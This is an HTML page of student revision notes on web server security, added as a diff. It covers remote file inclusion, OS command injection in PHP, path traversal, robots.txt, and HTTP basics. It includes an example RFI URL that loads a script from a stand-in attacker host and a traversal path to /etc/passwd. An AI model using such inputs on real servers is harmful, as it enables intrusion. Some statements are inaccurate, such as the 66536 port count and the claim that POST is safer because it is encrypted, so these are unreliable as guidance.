@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang=" en-US">
+
+<head>
+
+    
+    <meta charset="UTF-8"><!-- Include tocNAV javascript -->
+    <script type="text/javascript" src="/assets/js/tocNav.js"></script>
+    
+    <!-- seo used to be here -->
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link rel="preload" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700&display=swap" as="style"
+        type="text/css" crossorigin>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#157878">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link id="mainCS" rel="stylesheet" href="/assets/css/style.css">
+    <title>notes Web Server Security Issues</title>
+</head>
+
+<body>
+    <div id="mainGrid" class="container">
+        <header style="padding:10px;" class="page-header notes-header" role="banner">
+            
+            
+            <h1 class="project-name">Web Server Security Issues</h1>
+        </header>
+        <div title="Table of Contents" class="buttonCol" onclick="toggleNav()">
+            <div class="navArrow">
+                <i></i>
+            </div>
+        </div>
+        <div class="navBox">
+            <div id="sidenav" class="sideNav closedNav">
+                <h2 style="margin-left: 10px;">Table of Contents</h2><ul class="table-of-contents"><li><a href="#remote-file-inclusion-rfi-vulnerability">Remote File Inclusion (RFI) Vulnerability</a></li><li><a href="#forms">Forms</a><ul><li><a href="#call-os-commands-in-php">Call OS commands in PHP</a></li></ul></li><li><a href="#path-exploits">Path Exploits</a></li><li><a href="#robot-exclusion-protocol">Robot Exclusion Protocol</a></li><li><a href="#accompanying-resources">Accompanying resources</a><ul><li><a href="#interaction-between-client-and-web-server">Interaction between Client and Web Server</a></li><li><a href="#http-request">HTTP Request</a><ul><li><a href="#http-request-methods">HTTP Request Methods</a></li><li><a href="#how-http-server-process-requests">How HTTP server process requests</a><ul><li><a href="#listening">Listening</a></li><li><a href="#processing">Processing</a></li></ul></li></ul></li><li><a href="#php">PHP</a></li></ul></li></ul>
+</div>
+        </div>
+        
+        <div class="contents">
+            <main id="content" class="main-content" role="main">
+                <div class="partNav">
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <a href="part7.html" title="part7.html">👈Prev</a><a href="./" title="Primary Notes Home">🏡Primary Notes</a><a href="part9.html" title="part9.html">Next👉</a>
+
+
+
+</div>
+                <!-- Main Content of markdown or sub-layouts-->
+                <blockquote>
+  <p><strong>Note.</strong> In the revision lecture, Ligang mentioned that web server will not be tested during the exam 🥳</p>
+</blockquote>
+
+<p>A large part of this topic was meant for us to understand more about the interactions between a client and the web server – which was relevant for our coursework at the time.</p>
+
+<p>What I have done is included the main security issues at the top of this page, however if there is trouble understanding somethings then you might need to read the sections to understand more about PHP, HTTP requests, Client and Web Server interaction etc.</p>
+
+<h2 id="remote-file-inclusion-rfi-vulnerability">Remote File Inclusion (RFI) Vulnerability</h2>
+
+<p>If the URL sent by the user is:</p>
+
+<p>http://yoursite.com/index.php?page=http://ev.il/badscript.php?</p>
+
+<p>include <code class="language-plaintext highlighter-rouge">$_GET[‘page’]”.html”</code> becomes:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include http://ev.il/badscript.php?.html
+</code></pre></div></div>
+
+<p>What happens is that <code class="language-plaintext highlighter-rouge">badscript.php</code> will be run, because the content after “?” will be interpreted as input parameter of the php script.</p>
+
+<h2 id="forms">Forms</h2>
+
+<blockquote>
+  <p>A <strong>form</strong> is used to pass information from a web browser to a web server.</p>
+</blockquote>
+
+<p>There are 2 different ways to submit a form, GET or POST. Especially when forms contain sensitive information, POST is <strong>always safer</strong> than GET. When a form is sent:</p>
+
+<ul>
+  <li>GET request will have form parameters encoded in the head of the HTTP request as the address of the resource that we want to access.</li>
+  <li>POST requests will have the form parameters placed in the body of the HTTP requests. More <strong>secure</strong> because we can encrypt the HTTP request.</li>
+</ul>
+
+<h3 id="call-os-commands-in-php">Call OS commands in PHP</h3>
+
+<p>When using PHP, sometimes developers make the mistake of running shell commands through the PHP file that has a parameter/variable that depends on <strong>form inputs</strong>.</p>
+
+<blockquote>
+  <p>This is a potential vulnerability as an attacker can send code through these inputs and can make the web server OS perform commands that could compromise security.</p>
+</blockquote>
+
+<h2 id="path-exploits">Path Exploits</h2>
+
+<p>Path exploits try to enter the directory or access files that are not intended to be accessible.</p>
+
+<p>For example, if the user in put the web address:</p>
+
+<p>http://www.example.com/home/users/…/etc/passwd</p>
+
+<p>Without proper configuration, the passwd file will be displayed. When allow <code class="language-plaintext highlighter-rouge">_url_fopen</code> (a directive in the php configuration file - php.ini) is set to “on” – User’s will be allowed to retrieve and display the file in server, even if the file is not a typical web page (e.g. html or php).</p>
+
+<h2 id="robot-exclusion-protocol">Robot Exclusion Protocol</h2>
+
+<blockquote>
+  <p>Web crawlers or Web robots systematically scan the World Wide Web to mine data.</p>
+
+  <p>Robot Exclusion Protocol (REP) specifies which directories of the website that the robot should not scan.</p>
+</blockquote>
+
+<p>Instructions are written in the robots.txt file, which is in the root directory of the web server. Example:</p>
+
+<pre><code class="language-txt">User-agent:* # apply to all robots
+Disallow:/local/secure.html
+
+User-agents:Googlebot # apply only to Googlebot
+Disallow:/private/
+</code></pre>
+
+<p>When there is sensitive data, we should exclude robots from crawling those files.</p>
+
+<h2 id="accompanying-resources">Accompanying resources</h2>
+
+<p>That concludes the content covering potential security issues related to web servers. The content below is an additional resource to give background information about the Web Servers, PHP and HTTP requests. I recommend that you give it a read if you’re not confident in your knowledge of this topic.</p>
+
+<h3 id="interaction-between-client-and-web-server">Interaction between Client and Web Server</h3>
+
+<p>In general there are 5 main steps between client and server</p>
+
+<ol>
+  <li>User issues URL from a browser</li>
+  <li>Browser sends a request message</li>
+  <li>Server maps the URL to a file or program under the document directory</li>
+  <li>Server returns a response message</li>
+  <li>Browser formats the response and displays</li>
+</ol>
+
+<h3 id="http-request">HTTP Request</h3>
+
+<p>When a client types a URL address into the browser, our browser composes a message such as</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/docs/index/.html</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">www.nowhere123.com</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">image/gif, image/jpeg, */*</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-us</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozzila/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</span>
+<span class="s">{blank line}</span>
+</code></pre></div></div>
+
+<p>The message consists of a number of lines. The first line is the request line.</p>
+
+<ul>
+  <li><strong>Format</strong>: <u>message_name</u>  <u>request-uri</u> (address of the resource we want to access)  <u>HTTP-version</u>.</li>
+  <li>In the example this is the first line.</li>
+</ul>
+
+<p>Request line is followed by request headers</p>
+
+<ul>
+  <li><strong>Format</strong>: <u>name</u> : <u>value</u> pairs</li>
+  <li>In the example this is the 2nd line. Name is “Host”. Value is “www.nowhere123.com”</li>
+</ul>
+
+<p>Request line and request headers are together called request message header, followed by request message body. In the example above, the request message body is blank.</p>
+
+<h4 id="http-request-methods">HTTP Request Methods</h4>
+
+<ul>
+  <li>HTTP protocol defines a set of request methods.
+    <ul>
+      <li>in the example above, the message is <strong>GET</strong> - when we type an address in the browser search bar, we always trigger a GET request.</li>
+    </ul>
+  </li>
+</ul>
+
+<p><strong>Methods supported by web server</strong></p>
+
+<ul>
+  <li><strong>GET</strong> : get a web resource from the server</li>
+  <li><strong>HEAD</strong>: get the header that a GET request would have obtained</li>
+  <li><strong>POST</strong>: Used to post the data up to the web server</li>
+  <li><strong>PUT</strong>: Ask the server to store the data</li>
+  <li><strong>DELETE</strong>: Ask the server to delete the data</li>
+  <li><strong>OPTIONS</strong>: Ask the server to request the list of request methods it supports</li>
+</ul>
+
+<h4 id="how-http-server-process-requests">How HTTP server process requests</h4>
+
+<h5 id="listening">Listening</h5>
+
+<p>HTTP server listens to the port(s) specified in the configuration file of the server</p>
+
+<ul>
+  <li>Port is the endpoint communication destination and is associated to a process/service
+    <ul>
+      <li>the request arriving at a certain port will be processed by the associated service</li>
+    </ul>
+  </li>
+  <li>port is a 16 bit number- there are 66536 ports in a computer</li>
+  <li>http: 80, ssh: 22, ftp: 21, smtp: 25, etc.</li>
+</ul>
+
+<h5 id="processing">Processing</h5>
+
+<p>After the server receives the request there are three general ways to process to request</p>
+
+<ol>
+  <li>map the request to a <strong>file</strong> in the directory in the server, and returns the file to the client</li>
+  <li>map the request to a <strong>program</strong> in the server, executes the program, and returns the output of the program to the client. (e.g. post request, CGI)</li>
+  <li>the request cannot be satisfied, the server returns an <strong>error</strong> message.</li>
+</ol>
+
+<p>If the webpage is HTML file, CGI is one way to invoke a program in the server. If we use PHP to write a webpage we can embed functions in the web page. PHP is a tool for making dynamic web pages.</p>
+
+<h3 id="php">PHP</h3>
+
+<p>A section in HTML file. Here is an example:</p>
+
+<pre><code class="language-php+HTML">&lt;?php
+echo My first PHP 
+?&gt;
+</code></pre>
+
+<p><strong>Dynamic file loading in PHP</strong></p>
+
+<p>Suppose the link of your website is: http://yoursite.com/index.php</p>
+
+<p>In the webpage, there is the following php code:</p>
+
+<pre><code class="language-php+HTML">&lt;?php include $_GET['page']".html"; ?&gt;
+</code></pre>
+
+<p>PHP supports loading a file based on data passed via the URL parameter.</p>
+
+<p>When the user types the following web address:</p>
+
+<p>http://yoursite/com/index.php?page=photos</p>
+
+<ul>
+  <li>The content after “?” is interpreted as the parameter of the request</li>
+  <li>i.e. index.php is run with “page=photos” as input parameter.</li>
+</ul>
+
+<p>Lets look more at <code class="language-plaintext highlighter-rouge">include $_GET['page']".html</code>:</p>
+
+<p>In PHP there are internal arrays which are used to hold information that are passed from the client. The <code class="language-plaintext highlighter-rouge">$_</code> tells PHP that we are trying to access an array and <code class="language-plaintext highlighter-rouge">GET['page']</code> tells PHP we are trying to access the <code class="language-plaintext highlighter-rouge">page</code> variable in the <code class="language-plaintext highlighter-rouge">GET</code> array. The <code class="language-plaintext highlighter-rouge">include</code> statement loads “photos.html” because we pass page=photos.</p>
+
+<p>It is a dynamic web page, because the same source of the web page displays different content depending on the user’s input</p>
+
+<p>For example, if the user types <code class="language-plaintext highlighter-rouge">page=contact</code>, then contact.html page will be loaded instead.</p>
+
+
+
+
+                <footer class="site-footer">
+
+                    
+                    <span class="site-footer-owner"><a href="https://github.com/CSRG-Group/dcs-notes.github.io">dcs-notes.github.io</a> is maintained by <a href="https://github.com/CSRG-Group">CSRG-Group</a>.</span>
+                    
+                </footer>
+            </main>
+        </div>
+    </div>
+</body>
+
+</html>
+</html>
